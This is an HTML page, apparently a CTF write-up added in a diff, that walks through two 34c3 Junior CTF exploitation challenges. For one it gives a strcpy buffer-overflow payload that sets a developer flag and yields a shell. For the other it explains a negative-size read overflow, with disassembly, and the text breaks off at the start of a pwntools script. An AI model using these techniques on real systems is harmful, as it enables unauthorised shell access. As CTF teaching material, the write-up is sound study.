@@ -1,0 +1,1076 @@
+<!doctype html>
+<html lang="en">
+<head>
+<title>34c3 Junior   CTF</title>
+<!-- 2017-12-30 Sat 11:54 -->
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Org-mode">
+<meta name="author" content="Vishnu Dev TJ">
+
+<link  href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.5/js/bootstrap.min.js"></script>
+<style type="text/css">
+/* org mode styles on top of twbs */
+
+html {
+    position: relative;
+    min-height: 100%;
+}
+
+body {
+    font-size: 18px;
+    margin-bottom: 105px;
+}
+
+footer {
+    position: absolute;
+    bottom: 0;
+    width: 100%;
+    height: 101px;
+    background-color: #f5f5f5;
+}
+
+footer > div {
+    padding: 10px;
+}
+
+footer p {
+    margin: 0 0 5px;
+    text-align: center;
+    font-size: 16px;
+}
+
+#table-of-contents {
+    margin-top: 20px;
+    margin-bottom: 20px;
+}
+
+blockquote p {
+    font-size: 18px;
+}
+
+pre {
+    font-size: 16px;
+}
+
+.footpara {
+    display: inline-block;
+}
+
+figcaption {
+  font-size: 16px;
+  color: #666;
+  font-style: italic;
+  padding-bottom: 15px;
+}
+
+/* from twbs docs */
+
+.bs-docs-sidebar.affix {
+    position: static;
+}
+@media (min-width: 768px) {
+    .bs-docs-sidebar {
+        padding-left: 20px;
+    }
+}
+
+/* All levels of nav */
+.bs-docs-sidebar .nav > li > a {
+    display: block;
+    padding: 4px 20px;
+    font-size: 14px;
+    font-weight: 500;
+    color: #999;
+}
+.bs-docs-sidebar .nav > li > a:hover,
+.bs-docs-sidebar .nav > li > a:focus {
+    padding-left: 19px;
+    color: #A1283B;
+    text-decoration: none;
+    background-color: transparent;
+    border-left: 1px solid #A1283B;
+}
+.bs-docs-sidebar .nav > .active > a,
+.bs-docs-sidebar .nav > .active:hover > a,
+.bs-docs-sidebar .nav > .active:focus > a {
+    padding-left: 18px;
+    font-weight: bold;
+    color: #A1283B;
+    background-color: transparent;
+    border-left: 2px solid #A1283B;
+}
+
+/* Nav: second level (shown on .active) */
+.bs-docs-sidebar .nav .nav {
+    display: none; /* Hide by default, but at >768px, show it */
+    padding-bottom: 10px;
+}
+.bs-docs-sidebar .nav .nav > li > a {
+    padding-top: 1px;
+    padding-bottom: 1px;
+    padding-left: 30px;
+    font-size: 12px;
+    font-weight: normal;
+}
+.bs-docs-sidebar .nav .nav > li > a:hover,
+.bs-docs-sidebar .nav .nav > li > a:focus {
+    padding-left: 29px;
+}
+.bs-docs-sidebar .nav .nav > .active > a,
+.bs-docs-sidebar .nav .nav > .active:hover > a,
+.bs-docs-sidebar .nav .nav > .active:focus > a {
+    padding-left: 28px;
+    font-weight: 500;
+}
+
+/* Nav: third level (shown on .active) */
+.bs-docs-sidebar .nav .nav .nav {
+    padding-bottom: 10px;
+}
+.bs-docs-sidebar .nav .nav .nav > li > a {
+    padding-top: 1px;
+    padding-bottom: 1px;
+    padding-left: 40px;
+    font-size: 12px;
+    font-weight: normal;
+}
+.bs-docs-sidebar .nav .nav .nav > li > a:hover,
+.bs-docs-sidebar .nav .nav .nav > li > a:focus {
+    padding-left: 39px;
+}
+.bs-docs-sidebar .nav .nav .nav > .active > a,
+.bs-docs-sidebar .nav .nav .nav > .active:hover > a,
+.bs-docs-sidebar .nav .nav .nav > .active:focus > a {
+    padding-left: 38px;
+    font-weight: 500;
+}
+
+/* Show and affix the side nav when space allows it */
+@media (min-width: 992px) {
+    .bs-docs-sidebar .nav > .active > ul {
+        display: block;
+    }
+    /* Widen the fixed sidebar */
+    .bs-docs-sidebar.affix,
+    .bs-docs-sidebar.affix-bottom {
+        width: 213px;
+    }
+    .bs-docs-sidebar.affix {
+        position: fixed; /* Undo the static from mobile first approach */
+        top: 20px;
+    }
+    .bs-docs-sidebar.affix-bottom {
+        position: absolute; /* Undo the static from mobile first approach */
+    }
+    .bs-docs-sidebar.affix .bs-docs-sidenav,.bs-docs-sidebar.affix-bottom .bs-docs-sidenav {
+        margin-top: 0;
+        margin-bottom: 0
+    }
+}
+@media (min-width: 1200px) {
+    /* Widen the fixed sidebar again */
+    .bs-docs-sidebar.affix-bottom,
+    .bs-docs-sidebar.affix {
+        width: 263px;
+    }
+}
+</style>
+<script type="text/javascript">
+$(function() {
+    'use strict';
+
+    $('.bs-docs-sidebar li').first().addClass('active');
+
+    $(document.body).scrollspy({target: '.bs-docs-sidebar'});
+
+    $('.bs-docs-sidebar').affix();
+});
+</script>
+</head>
+<body>
+<div id="content" class="container">
+<div class="row"><div class="col-md-9"><h1 class="title">34c3 Junior   CTF</h1>
+<link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet"> 
+<style type="text/css">
+.h3, h3 {
+    font-size: 25px;
+    padding: 10px
+}
+.h4, h4 {
+    font-size: 21px;
+    padding: 22px
+}
+
+/* All levels of nav */
+.bs-docs-sidebar .nav > li > a {
+    display: block;
+    padding: 4px 20px;
+    font-size: 14px;
+    font-weight: 500;
+    color: #999;
+}
+.bs-docs-sidebar .nav > li > a:hover,
+.bs-docs-sidebar .nav > li > a:focus {
+    padding-left: 19px;
+    color: #2bbc8a;
+ text-decoration: none;
+    background-color: transparent;
+    border-left: 1px solid #2bbc8a;
+ }
+.bs-docs-sidebar .nav > .active > a,
+.bs-docs-sidebar .nav > .active:hover > a,
+.bs-docs-sidebar .nav > .active:focus > a {
+    padding-left: 18px;
+    font-weight: bold;
+    color: #2bbc8a;
+    background-color: transparent;
+    border-left: 2px solid #2bbc8a;
+ }
+body {
+color: #c9cacc;
+background-color: #1d1f21;
+font-family: "Source Code Pro" , "Menlo", "Meslo LG", monospace;
+}
+a {
+	color: #2bbc8a;
+	text-decoration: none;
+}
+a:focus, a:hover {
+	color: #2bbc8a;
+	text-decoration: underline;
+}
+pre {
+	color: #d1d9e1;
+	background-color: #212326;
+	padding-left: 40px;
+	padding-top: 20px;
+	padding-bottom: 20px;
+        border: 1px solid #212326;
+font-family: "Source Code Pro" , "Menlo", "Meslo LG", monospace;
+}
+code {
+	background-color: #212326;
+}
+footer {
+	background-color: #212326;
+}
+</style>
+
+
+
+
+
+<div id="outline-container-sec-1" class="outline-2">
+<h2 id="sec-1"><span class="section-number-2">1</span> Exploitaion</h2>
+<div class="outline-text-2" id="text-1">
+</div><div id="outline-container-sec-1-1" class="outline-3">
+<h3 id="sec-1-1"><span class="section-number-3">1.1</span> Digital Billboard - easy</h3>
+<div class="outline-text-3" id="text-1-1">
+<blockquote>
+<p>
+We bought a new Digital Billboard for CTF advertisement:
+</p>
+
+<p>
+nc 35.198.185.193 1337
+</p>
+</blockquote>
+
+<p>
+Files : <a href="files/billboard/">billoard</a>
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">-&gt; % nc localhost 12345
+*
+ Digital Billboard
+*
+We bought a new digital billboard for CTF advertisement.
+
+Type <span style="color: #7bc275;">"help"</span> for help :)
+&gt; help
+set_text &lt;text&gt;                 (Set the text displayed on the board)
+<span style="color: #5cEfFF;">devmode</span>                         (Developer mode)
+<span style="color: #5cEfFF;">help</span>                            (Show this information)
+<span style="color: #5cEfFF;">modinfo</span>                         (Show information about the loaded module)
+&gt; set_text hello
+Successfully set text to: hello
+&gt; devmode
+Developer mode disabled!
+&gt;
+
+</pre>
+</div>
+
+<p>
+We are given the binary as well as the source files . We can now run the server , but it gives an error that the user challenge does not exit , 
+just add a user called challenge , after that we can run the server and connect it with nc .
+</p>
+
+<p>
+The following function is called when devmode option is selected and it checks if the devmode variable have a non zero value and spawn's a shell
+</p>
+<div class="org-src-container">
+
+<pre class="src src-C"><span style="color: #FCCE7B;">void</span> <span style="color: #5cEfFF;">shell</span>(<span style="color: #FCCE7B;">int</span> <span style="color: #DFDFDF;">argc</span>, <span style="color: #FCCE7B;">char</span>* <span style="color: #DFDFDF;">argv</span>[]) {
+    <span style="color: #51afef;">if</span> (bb.devmode) {
+        printf(<span style="color: #7bc275;">"Developer access to billboard granted.\n"</span>);
+        system(<span style="color: #7bc275;">"/bin/bash"</span>);
+    } <span style="color: #51afef;">else</span> {
+        printf(<span style="color: #7bc275;">"Developer mode disabled!\n"</span>);
+    }
+    <span style="color: #51afef;">return</span>;
+}
+</pre>
+</div>
+
+<p>
+We can see that there is a buffer overflow in <code>set_text</code> function 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-C"><span style="color: #FCCE7B;">void</span> <span style="color: #5cEfFF;">set_text</span>(<span style="color: #FCCE7B;">int</span> <span style="color: #DFDFDF;">argc</span>, <span style="color: #FCCE7B;">char</span>* <span style="color: #DFDFDF;">argv</span>[]) {
+    strcpy(bb.text, argv[1]);
+    printf(<span style="color: #7bc275;">"Successfully set text to: %s\n"</span>, bb.text);
+    <span style="color: #51afef;">return</span>;
+}
+</pre>
+</div>
+
+<p>
+it copy's arbitrary length of string to <code>bb.text</code> 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-C"><span style="color: #51afef;">struct</span> <span style="color: #FCCE7B;">billboard</span> {
+    <span style="color: #FCCE7B;">char</span> <span style="color: #DFDFDF;">text</span>[256];
+    <span style="color: #FCCE7B;">char</span> <span style="color: #DFDFDF;">devmode</span>;
+};
+<span style="color: #51afef;">struct</span> <span style="color: #FCCE7B;">billboard</span> <span style="color: #DFDFDF;">bb</span> = { .text=<span style="color: #7bc275;">"Placeholder"</span>, .devmode=0 };
+
+</pre>
+</div>
+
+<p>
+Using this buffer overflow we can overflow the <code>devmode</code> variable and set it to arbitrary value , 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">*
+ Digital Billboard
+*
+We bought a new digital billboard for CTF advertisement.
+
+Type <span style="color: #7bc275;">"help"</span> for help :)
+&gt; set_text AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Successfully set text to: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+&gt; devmode
+Developer access to billboard granted.
+cat flag.txt
+34C3_w3lc0me_t0_34c3_ctf_H4ve_fuN
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-sec-1-2" class="outline-3">
+<h3 id="sec-1-2"><span class="section-number-3">1.2</span> Gift Wrapping Factory - easy/mid</h3>
+<div class="outline-text-3" id="text-1-2">
+<blockquote>
+<p>
+
+</p>
+
+<p>
+Have trouble wrapping your gifts nicely? Take a look at this new service:
+</p>
+
+<p>
+nc 35.198.185.193 1338
+</p>
+</blockquote>
+
+<p>
+Files : <a href="files/wrap/">wrap</a> 
+</p>
+
+<p>
+We are given the server source and the server binary and the giftwrapper shared library . 
+</p>
+
+<p>
+connecting to the server gives the following prompt
+</p>
+<div class="org-src-container">
+
+<pre class="src src-sh">*
+ Gift Wrapping Factory
+*
+Welcome to the new gift wrapping service!
+Type <span style="color: #7bc275;">"help"</span> for help :)
+&gt; wrap
+What is the size of the gift you want to wrap?
+ |&gt; 10
+Please send me your gift.
+ |&gt; hello
+         _   _
+        ((\o/))
+ .-------//^<span style="color: #7bc275;">\\</span>------.
+ |      /<span style="color: #C57BDB; font-weight: bold;">`   `</span><span style="color: #7bc275;">\ </span>    |
+ |                  |
+ | hello            |
+ |                  |
+  ------------------
+
+Wow! This looks so beautiful
+&gt; modinfo
+************************************
+Information about the loaded module:
+Name: Gift Wrapping Factory
+Base address: 0x7f54c5187000
+************************************
+&gt;
+
+</pre>
+</div>
+
+<p>
+wrap takes a input size and read's that much character and prints the result 
+</p>
+
+<p>
+Let's analyse the function . 
+</p>
+<div class="org-src-container">
+
+<pre class="src src-nasm">         <span style="color: #a991f1;">0x0000087a</span> b    <span style="color: #a991f1;">4154</span>           <span style="color: #C57BDB;">push</span> <span style="color: #DFDFDF;">r12</span>                                                                                                                <span style="color: #a991f1;">0x0000087c</span>      <span style="color: #a991f1;">55</span>             <span style="color: #C57BDB;">push</span> <span style="color: #DFDFDF;">rbp</span>                                                                                                    
+         <span style="color: #a991f1;">0x0000087d</span>      <span style="color: #a991f1;">53</span>             <span style="color: #C57BDB;">push</span> <span style="color: #DFDFDF;">rbx</span>                                                                                                    
+         <span style="color: #a991f1;">0x0000087e</span>      <span style="color: #a991f1;">4883ec70</span>       <span style="color: #C57BDB;">sub</span> <span style="color: #DFDFDF;">rsp</span>, <span style="color: #a991f1;">0x70</span>               <span style="color: #62686E;">; 'p'                                                                           </span>
+         <span style="color: #a991f1;">0x00000882</span>      <span style="color: #a991f1;">488d3db70100.</span>  <span style="color: #C57BDB;">lea</span> <span style="color: #DFDFDF;">rdi</span>, str.What_is_the_size_of_the_gift_you_want_<span style="color: #FCCE7B;">to</span>_wrap__n___    <span style="color: #62686E;">; 0xa40 ; "What is the size of the gift </span>
+         <span style="color: #a991f1;">0x00000889</span>      b800000000     <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">eax</span>, <span style="color: #a991f1;">0</span>                                                                                                  
+         <span style="color: #a991f1;">0x0000088e</span>      e8cdfeffff     <span style="color: #C57BDB;">call</span> sub.printf_<span style="color: #a991f1;">40_760</span>      <span style="color: #62686E;">;[1]                                                                            </span>
+         <span style="color: #a991f1;">0x00000893</span>      <span style="color: #a991f1;">488d742465</span>     <span style="color: #C57BDB;">lea</span> <span style="color: #DFDFDF;">rsi</span>, [<span style="color: #DFDFDF;">rsp</span> + <span style="color: #a991f1;">0x65</span>]       <span style="color: #62686E;">; 'e'                                                                           </span>
+         <span style="color: #a991f1;">0x00000898</span>      <span style="color: #a991f1;">48c744246500.</span>  <span style="color: #C57BDB;">mov</span> <span style="color: #FCCE7B;">qword</span> [<span style="color: #DFDFDF;">rsp</span> + <span style="color: #a991f1;">0x65</span>], <span style="color: #a991f1;">0</span>                                                                                   
+         <span style="color: #a991f1;">0x000008a1</span>      <span style="color: #a991f1;">66c744246d00.</span>  <span style="color: #C57BDB;">mov</span> <span style="color: #FCCE7B;">word</span> [<span style="color: #DFDFDF;">rsp</span> + <span style="color: #a991f1;">0x6d</span>], <span style="color: #a991f1;">0</span>                                                                                    
+         <span style="color: #a991f1;">0x000008a8</span>      c644246f00     <span style="color: #C57BDB;">mov</span> <span style="color: #FCCE7B;">byte</span> [<span style="color: #DFDFDF;">rsp</span> + <span style="color: #a991f1;">0x6f</span>], <span style="color: #a991f1;">0</span>                                                                                    
+         <span style="color: #a991f1;">0x000008ad</span>      ba0a000000     <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">edx</span>, <span style="color: #a991f1;">0xa</span>                                                                                                
+         <span style="color: #a991f1;">0x000008b2</span>      bf01000000     <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">edi</span>, <span style="color: #a991f1;">1</span>                                                                                                  
+         <span style="color: #a991f1;">0x000008b7</span>      e8b4feffff     <span style="color: #C57BDB;">call</span> sym.imp.read           <span style="color: #62686E;">;[2] ; ssize_t read(int fildes, void *buf, size_t nbyte)                        </span>
+         <span style="color: #a991f1;">0x000008bc</span>      <span style="color: #a991f1;">4885c0</span>         <span style="color: #C57BDB;">test</span> <span style="color: #DFDFDF;">rax</span>, <span style="color: #DFDFDF;">rax</span>                                                                                               
+     ,=&lt; <span style="color: #a991f1;">0x000008bf</span>      <span style="color: #a991f1;">0f8eed000000</span>   <span style="color: #C57BDB;">jle</span> <span style="color: #a991f1;">0x9b2</span>                   <span style="color: #62686E;">;[3]                                                                            </span>
+     |   <span style="color: #a991f1;">0x000008c5</span>      <span style="color: #a991f1;">488d7c2465</span>     <span style="color: #C57BDB;">lea</span> <span style="color: #DFDFDF;">rdi</span>, [<span style="color: #DFDFDF;">rsp</span> + <span style="color: #a991f1;">0x65</span>]       <span style="color: #62686E;">; 'e'                                                                           </span>
+     |   <span style="color: #a991f1;">0x000008ca</span>      ba00000000     <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">edx</span>, <span style="color: #a991f1;">0</span>                                                                                                  
+     |   <span style="color: #a991f1;">0x000008cf</span>      be00000000     <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">esi</span>, <span style="color: #a991f1;">0</span>                                                                                                  
+     |   <span style="color: #a991f1;">0x000008d4</span>      e8a7feffff     <span style="color: #C57BDB;">call</span> sym.imp.strtol         <span style="color: #62686E;">;[4] ; long strtol(const char *str, char**endptr, int base)                     </span>
+     |   <span style="color: #a991f1;">0x000008d9</span>      <span style="color: #a991f1;">4889c5</span>         <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">rbp</span>, <span style="color: #DFDFDF;">rax</span>                                                                                                
+     |   <span style="color: #a991f1;">0x000008dc</span>      <span style="color: #a991f1;">6683f863</span>       <span style="color: #C57BDB;">cmp</span> <span style="color: #DFDFDF;">ax</span>, <span style="color: #a991f1;">0x63</span>                <span style="color: #62686E;">; 'c'                                                                           </span>
+    ,==&lt; <span style="color: #a991f1;">0x000008e0</span>      <span style="color: #a991f1;">0f8fd6000000</span>   <span style="color: #C57BDB;">jg</span> <span style="color: #a991f1;">0x9bc</span>                    <span style="color: #62686E;">;[5]                                                                            </span>
+    ||   <span style="color: #a991f1;">0x000008e6</span>      <span style="color: #a991f1;">488d3dab0100.</span>  <span style="color: #C57BDB;">lea</span> <span style="color: #DFDFDF;">rdi</span>, str.Please_send_me_your_gift._n___    <span style="color: #62686E;">; 0xa98 ; "Please send me your gift.\n |&gt; "                  </span>
+    ||   <span style="color: #a991f1;">0x000008ed</span>      b800000000     <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">eax</span>, <span style="color: #a991f1;">0</span>                                                                                                  
+    ||   <span style="color: #a991f1;">0x000008f2</span>      e869feffff     <span style="color: #C57BDB;">call</span> sub.printf_<span style="color: #a991f1;">40_760</span>      <span style="color: #62686E;">;[1]                                                                            </span>
+    ||   <span style="color: #a991f1;">0x000008f7</span>      <span style="color: #a991f1;">4889e6</span>         <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">rsi</span>, <span style="color: #DFDFDF;">rsp</span>                                                                                                
+    ||   <span style="color: #a991f1;">0x000008fa</span>      b90c000000     <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">ecx</span>, <span style="color: #a991f1;">0xc</span>                                                                                                
+    ||   <span style="color: #a991f1;">0x000008ff</span>      b800000000     <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">eax</span>, <span style="color: #a991f1;">0</span>                                                                                                  
+    ||   <span style="color: #a991f1;">0x00000904</span>      <span style="color: #a991f1;">4889f7</span>         <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">rdi</span>, <span style="color: #DFDFDF;">rsi</span>                                                                                                
+    ||   <span style="color: #a991f1;">0x00000907</span>      f348ab         <span style="color: #C57BDB;">rep</span> <span style="color: #C57BDB;">stosq</span> <span style="color: #FCCE7B;">qword</span> [<span style="color: #DFDFDF;">rdi</span>], <span style="color: #DFDFDF;">rax</span>                                                                                  
+    ||   <span style="color: #a991f1;">0x0000090a</span>      c70700000000   <span style="color: #C57BDB;">mov</span> <span style="color: #FCCE7B;">dword</span> [<span style="color: #DFDFDF;">rdi</span>], <span style="color: #a991f1;">0</span>                                                                                          
+    ||   <span style="color: #a991f1;">0x00000910</span>      <span style="color: #a991f1;">0fb7c5</span>         <span style="color: #C57BDB;">movzx</span> <span style="color: #DFDFDF;">eax</span>, <span style="color: #DFDFDF;">bp</span>                                                                                               
+    ||   <span style="color: #a991f1;">0x00000913</span>      <span style="color: #a991f1;">488d5001</span>       <span style="color: #C57BDB;">lea</span> <span style="color: #DFDFDF;">rdx</span>, [<span style="color: #DFDFDF;">rax</span> + <span style="color: #a991f1;">1</span>]                                                                                          
+    ||   <span style="color: #a991f1;">0x00000917</span>      bf01000000     <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">edi</span>, <span style="color: #a991f1;">1</span>                                                                                                  
+    ||   <span style="color: #a991f1;">0x0000091c</span>      e84ffeffff     <span style="color: #C57BDB;">call</span> sym.imp.read           <span style="color: #62686E;">;[2] ; ssize_t read(int fildes, void *buf, size_t nbyte)                        </span>
+    ||   <span style="color: #a991f1;">0x00000921</span>      <span style="color: #a991f1;">83e801</span>         <span style="color: #C57BDB;">sub</span> <span style="color: #DFDFDF;">eax</span>, <span style="color: #a991f1;">1</span>                                                                                         [<span style="color: #a991f1;">19</span>/<span style="color: #a991f1;">1924</span>]
+    ||   <span style="color: #a991f1;">0x00000924</span>      <span style="color: #a991f1;">4863d0</span>         <span style="color: #C57BDB;">movsxd</span> <span style="color: #DFDFDF;">rdx</span>, <span style="color: #DFDFDF;">eax</span>
+    ||   <span style="color: #a991f1;">0x00000927</span>      <span style="color: #a991f1;">803c140a</span>       <span style="color: #C57BDB;">cmp</span> <span style="color: #FCCE7B;">byte</span> [<span style="color: #DFDFDF;">rsp</span> + <span style="color: #DFDFDF;">rdx</span>], <span style="color: #a991f1;">0xa</span>   <span style="color: #62686E;">; [0xa:1]=0</span>
+   ,===&lt; <span style="color: #a991f1;">0x0000092b</span>      <span style="color: #a991f1;">0f8499000000</span>   <span style="color: #C57BDB;">je</span> <span style="color: #a991f1;">0x9ca</span>
+   |||      <span style="color: #62686E;">; JMP XREF from 0x000009ce (sym.wrap)</span>
+  .----&gt; <span style="color: #a991f1;">0x00000931</span>      <span style="color: #a991f1;">488d3d800100.</span>  <span style="color: #C57BDB;">lea</span> <span style="color: #DFDFDF;">rdi</span>, str._____________n____________o__________n_.____________________._n_______________________n________
+__________ <span style="color: #62686E;">; 0xab8 ; "         _   _       \n        ((\\o/))      \n .-------//^\\\\------.\n |      /`   `\\     |\n |                  |"</span>
+  :|||   <span style="color: #a991f1;">0x00000938</span>      e803feffff     <span style="color: #C57BDB;">call</span> sym.imp.puts           <span style="color: #62686E;">; int puts(const char *s)</span>
+  :|||   <span style="color: #a991f1;">0x0000093d</span>      <span style="color: #a991f1;">6685ed</span>         <span style="color: #C57BDB;">test</span> <span style="color: #DFDFDF;">bp</span>, <span style="color: #DFDFDF;">bp</span>
+ ,=====&lt; <span style="color: #a991f1;">0x00000940</span>      <span style="color: #a991f1;">7e4f</span>           <span style="color: #C57BDB;">jle</span> <span style="color: #a991f1;">0x991</span>
+ |:|||   <span style="color: #a991f1;">0x00000942</span>      <span style="color: #a991f1;">0fbfed</span>         <span style="color: #C57BDB;">movsx</span> <span style="color: #DFDFDF;">ebp</span>, <span style="color: #DFDFDF;">bp</span>
+ |:|||   <span style="color: #a991f1;">0x00000945</span>      <span style="color: #a991f1;">83ed01</span>         <span style="color: #C57BDB;">sub</span> <span style="color: #DFDFDF;">ebp</span>, <span style="color: #a991f1;">1</span>
+ |:|||   <span style="color: #a991f1;">0x00000948</span>      <span style="color: #a991f1;">83e5f0</span>         <span style="color: #C57BDB;">and</span> <span style="color: #DFDFDF;">ebp</span>, <span style="color: #a991f1;">0xfffffff0</span>
+ |:|||   <span style="color: #a991f1;">0x0000094b</span>      <span style="color: #a991f1;">83c510</span>         <span style="color: #C57BDB;">add</span> <span style="color: #DFDFDF;">ebp</span>, <span style="color: #a991f1;">0x10</span>
+ |:|||   <span style="color: #a991f1;">0x0000094e</span>      bb00000000     <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">ebx</span>, <span style="color: #a991f1;">0</span>
+ |:|||   <span style="color: #a991f1;">0x00000953</span>      <span style="color: #a991f1;">4989e4</span>         <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">r12</span>, <span style="color: #DFDFDF;">rsp</span>
+ |:|||      <span style="color: #62686E;">; JMP XREF from 0x0000098f (sym.wrap)</span>
+.------&gt; <span style="color: #a991f1;">0x00000956</span>      <span style="color: #a991f1;">4863f3</span>         <span style="color: #C57BDB;">movsxd</span> <span style="color: #DFDFDF;">rsi</span>, <span style="color: #DFDFDF;">ebx</span>
+:|:|||   <span style="color: #a991f1;">0x00000959</span>      <span style="color: #a991f1;">4c01e6</span>         <span style="color: #C57BDB;">add</span> <span style="color: #DFDFDF;">rsi</span>, <span style="color: #DFDFDF;">r12</span>                <span style="color: #62686E;">; 'n'</span>
+:|:|||   <span style="color: #a991f1;">0x0000095c</span>      <span style="color: #a991f1;">488d3d3d0200.</span>  <span style="color: #C57BDB;">lea</span> <span style="color: #DFDFDF;">rdi</span>, str.___.16s        <span style="color: #62686E;">; 0xba0 ; " | %.16s"</span>
+:|:|||   <span style="color: #a991f1;">0x00000963</span>      b800000000     <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">eax</span>, <span style="color: #a991f1;">0</span>
+:|:|||   <span style="color: #a991f1;">0x00000968</span>      e8f3fdffff     <span style="color: #C57BDB;">call</span> sym.imp.printf         <span style="color: #62686E;">; int printf(const char *format)</span>
+:|:|||   <span style="color: #a991f1;">0x0000096d</span>      be13000000     <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">esi</span>, <span style="color: #a991f1;">0x13</span>
+:|:|||   <span style="color: #a991f1;">0x00000972</span>      <span style="color: #a991f1;">29c6</span>           <span style="color: #C57BDB;">sub</span> <span style="color: #DFDFDF;">esi</span>, <span style="color: #DFDFDF;">eax</span>
+:|:|||   <span style="color: #a991f1;">0x00000974</span>      ba20000000     <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">edx</span>, <span style="color: #a991f1;">0x20</span>               <span style="color: #62686E;">; "@"</span>
+:|:|||   <span style="color: #a991f1;">0x00000979</span>      <span style="color: #a991f1;">488d3d290200.</span>  <span style="color: #C57BDB;">lea</span> <span style="color: #DFDFDF;">rdi</span>, str.__c___n        <span style="color: #62686E;">; 0xba9 ; "%*c |\n"</span>
+:|:|||   <span style="color: #a991f1;">0x00000980</span>      b800000000     <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">eax</span>, <span style="color: #a991f1;">0</span>
+:|:|||   <span style="color: #a991f1;">0x00000985</span>      e8d6fdffff     <span style="color: #C57BDB;">call</span> sym.imp.printf         <span style="color: #62686E;">; int printf(const char *format)</span>
+:|:|||   <span style="color: #a991f1;">0x0000098a</span>      <span style="color: #a991f1;">83c310</span>         <span style="color: #C57BDB;">add</span> <span style="color: #DFDFDF;">ebx</span>, <span style="color: #a991f1;">0x10</span>
+:|:|||   <span style="color: #a991f1;">0x0000098d</span>      <span style="color: #a991f1;">39eb</span>           <span style="color: #C57BDB;">cmp</span> <span style="color: #DFDFDF;">ebx</span>, <span style="color: #DFDFDF;">ebp</span>
+<span style="color: #7bc275;">`======&lt; 0x0000098f      75c5           jne 0x956</span>
+<span style="color: #7bc275;"> |:|||      ; JMP XREF from 0x00000940 (sym.wrap)</span>
+<span style="color: #7bc275;"> `</span>-----&gt; <span style="color: #a991f1;">0x00000991</span>      <span style="color: #a991f1;">488d3d900100.</span>  <span style="color: #C57BDB;">lea</span> <span style="color: #DFDFDF;">rdi</span>, str._____________________n______________________n <span style="color: #62686E;">; 0xb28 ; " |                  |\n  -------------</span>
+-- \n<span style="color: #7bc275;">"</span>
+<span style="color: #7bc275;">  :|||   0x00000998      e8a3fdffff     call sym.imp.puts           ; int puts(const char *s)</span>
+<span style="color: #7bc275;">  :|||   0x0000099d      488d3d0c0200.  lea rdi, str.Wow__This_looks_so_beautiful ; 0xbb0 ; "</span>Wow! This looks so beautiful<span style="color: #7bc275;">"</span>
+<span style="color: #7bc275;">  :|||   0x000009a4      e897fdffff     call sym.imp.puts           ; int puts(const char *s)</span>
+<span style="color: #7bc275;"> .-----&gt; 0x000009a9      4883c470       add rsp, 0x70               ; 'p'</span>
+<span style="color: #7bc275;"> ::|||   0x000009ad      5b             pop rbx</span>
+<span style="color: #7bc275;"> ::|||   0x000009ae      5d             pop rbp</span>
+<span style="color: #7bc275;"> ::|||   0x000009af      415c           pop r12</span>
+<span style="color: #7bc275;"> ::|||   0x000009b1      c3             ret</span>
+
+</pre>
+</div>
+
+<p>
+The function reads the size of the input and use <code>strol</code> function to convert the string to int , then checks if the number is 
+larger than 0x63 if it is the text the gift is too large is printed , then reads the gift with <code>read</code> function with the inputted number
+as the size of bytes to be read .
+</p>
+
+<p>
+The bug is that we can give a negative number and  it will be stored in memory as two's complement form but the read function takes this 
+as a unsigned integer so -1 -&gt; 0xffffffff in two's complement , will make <code>read</code> read 0xffffffff bytes of data . now we have a buffer overflow
+</p>
+
+<p>
+There is a <code>spawn_shell</code> function in the library we just need to jump to that location . Since ASLR is turned on we need to calculate the offset.
+we can use the <code>modeinfo</code> function to get the base address if the library can calculate the offset.
+</p>
+
+
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #51afef;">from</span> pwn <span style="color: #51afef;">import</span> *
+
+
+<span style="color: #62686E;"># </span><span style="color: #62686E;">host = "localhost"</span>
